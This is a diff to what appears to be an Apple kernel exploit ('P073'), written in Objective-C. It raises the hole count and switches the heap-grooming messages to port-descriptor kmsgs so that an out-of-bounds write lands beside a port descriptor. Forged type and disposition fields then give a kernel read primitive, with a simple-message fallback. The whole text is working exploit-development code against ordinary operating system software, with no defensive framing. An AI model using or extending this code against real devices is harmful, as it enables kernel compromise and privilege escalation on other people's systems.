@@ -49,7 +49,7 @@
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
 #define P073_KDATA_SIZE   (P073_MSG_SIZE + 0x24u)
-#define P073_N_HOLES      128u   /* consecutive simples, ALL punched (LIFO) */
+#define P073_N_HOLES      256u   /* v8: consecutive PORTKIND descs, ALL punched (LIFO) */
 #define P073_N_SENT       64u    /* live sentinels before AND after holes */
 #define P073_MAGIC        0x50730000u  /* "P073" */
 
@@ -600,11 +600,17 @@ static NSURL *p073_model_url(NSString *name) {
         if (!p073_send_simple(p, sentPre[nPre].index)) break;
         nPre++;
     }
+    /* v8: holes are PORTKIND descriptor kmsgs - the fill's record OOB lands
+       NEXT to (or over) a PORT DESCRIPTOR by construction; forged type@8 +
+       disp@10 = the p073-v7 kread door. Simple fallback keeps the band alive
+       if port-kind is rejected. */
     for (uint32_t i = 0; i < P073_N_HOLES; i++) {
         mach_port_t p = p073_make_port();
         if (p == MACH_PORT_NULL) break;
         holes[nHoles].port = p; holes[nHoles].index = 0x2000u | i; holes[nHoles].alive = YES;
-        if (!p073_send_simple(p, holes[nHoles].index)) break;
+        if (!p073_send_portkind(p, holes[nHoles].index)) {
+            if (!p073_send_simple(p, holes[nHoles].index)) break;
+        }
         nHoles++;
     }
     for (uint32_t i = 0; i < P073_N_SENT; i++) {
